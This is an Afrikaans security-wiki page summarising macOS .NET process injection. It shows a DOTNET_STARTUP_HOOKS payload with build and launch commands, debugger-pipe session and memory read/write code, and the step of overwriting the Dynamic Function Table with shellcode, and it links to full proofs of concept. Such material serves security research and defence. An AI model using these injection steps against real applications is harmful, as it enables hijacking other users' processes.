# macOS .Net Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n opsomming van die plasing [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Raadpleeg dit vir verdere besonderhede!**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 en later ondersteun die `DOTNET_STARTUP_HOOKS`-omgewingsveranderlike. Elke pad moet 'n managed assembly identifiseer wat 'n globale `StartupHook`-tipe met 'n `public static void Initialize()`-metode bevat. Die host laai die assemblies en roep hul initializers sinchronies aan voordat die toepassing se `Main`-ingangspunt uitgevoer word, wat omgewingsbeheer plus 'n leesbare DLL 'n direkte pre-main-kode-uitvoeringsprimitief gee.<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Die hook assembly moet versoenbaar wees met die toepassing se runtime en dependencies. Relatiewe paths wat directory separators bevat, word verwerp; gebruik ’n absolute path of ’n assembly name wat vanuit die default load context opgelos kan word. Startup hooks is by verstek gedeaktiveer in trimmed applications, en custom native hosts kan runtime properties direk verskaf eerder as om die environment te erf.<sup>[[2]](#references)</sup>

Defensive launchers behoort `DOTNET_STARTUP_HOOKS` skoon te maak, onbetroubare writes na application- en shared assembly paths te voorkom, en self-contained en trimmed deployments afsonderlik te toets.

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Vestiging van ’n Debugging Session** <a href="#net-core-debugging" id="net-core-debugging"></a>

Die hantering van kommunikasie tussen debugger en debuggee in .NET word deur [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) bestuur. Hierdie komponent stel twee named pipes per .NET-proses op, soos gesien in [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), wat deur [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) geïnisieer word. Hierdie pipes eindig met **`-in`** en **`-out`**.

Deur die gebruiker se **`$TMPDIR`** te besoek, kan ’n mens debugging FIFOs vind wat vir debugging van .NET-toepassings beskikbaar is.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) is verantwoordelik vir die bestuur van kommunikasie vanaf ’n debugger. Om ’n nuwe debugging session te begin, moet ’n debugger ’n boodskap via die `out` pipe stuur wat met ’n `MessageHeader`-struct begin, soos in die .NET-bronkode uiteengesit:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Om 'n nuwe sessie aan te vra, word hierdie struct soos volg ingevul, deur die boodskaptipe op `MT_SessionRequest` en die protokolweergawe op die huidige weergawe te stel:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Hierdie header word dan met behulp van die `write`-syscall na die teiken gestuur, gevolg deur die `sessionRequestData`-struktuur wat ’n GUID vir die sessie bevat:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
'n Leesbewerking op die `out`-pyp bevestig die sukses of mislukking van die vestiging van die debugging-sessie:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Geheue lees

Sodra 'n debugging-sessie gevestig is, kan geheue gelees word deur die [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896)-boodskaptipe te gebruik. Die funksie readMemory word volledig uiteengesit en voer die nodige stappe uit om 'n leesversoek te stuur en die antwoord te verkry:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Die volledige proof of concept (POC) is [hier](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b) beskikbaar.

## Skryf na geheue

Net so kan geheue met die `writeMemory`-funksie geskryf word. Die proses behels dat die boodskaptipe op `MT_WriteMemory` gestel word, die adres en lengte van die data gespesifiseer word, en dan die data gestuur word:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
Die geassosieerde POC is [hier](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5) beskikbaar.

## .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Om code uit te voer, moet ’n geheuegebied met rwx-toestemmings geïdentifiseer word, wat met vmmap -pages gedoen kan word:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Om ’n plek te vind waar ’n funksiewyser oorgeskryf kan word, is nodig, en in .NET Core kan dit gedoen word deur die **Dynamic Function Table (DFT)** te teiken. Hierdie tabel, soos uiteengesit in [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), word deur die runtime vir JIT-kompilasie-hulpfunksies gebruik.

Vir x64-stelsels kan signature hunting gebruik word om ’n verwysing na die simbool `_hlpDynamicFuncTable` in `libcorclr.dll` te vind.

Die `MT_GetDCB`-debuggerfunksie verskaf nuttige inligting, insluitend die adres van ’n hulpfunksie, `m_helperRemoteStartAddr`, wat die ligging van `libcorclr.dll` in die prosesgeheue aandui. Hierdie adres word dan gebruik om ’n soektog na die DFT te begin en ’n funksiewyser met die shellcode se adres te oorskryf.

Die volledige POC-kode vir injection in PowerShell is [hier](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6) beskikbaar.

## References

- [1] [Adam Chester (xpnsec) - macOS Injection via Derdeparty-frameworks](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [.NET runtime host startup hook-ontwerp](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
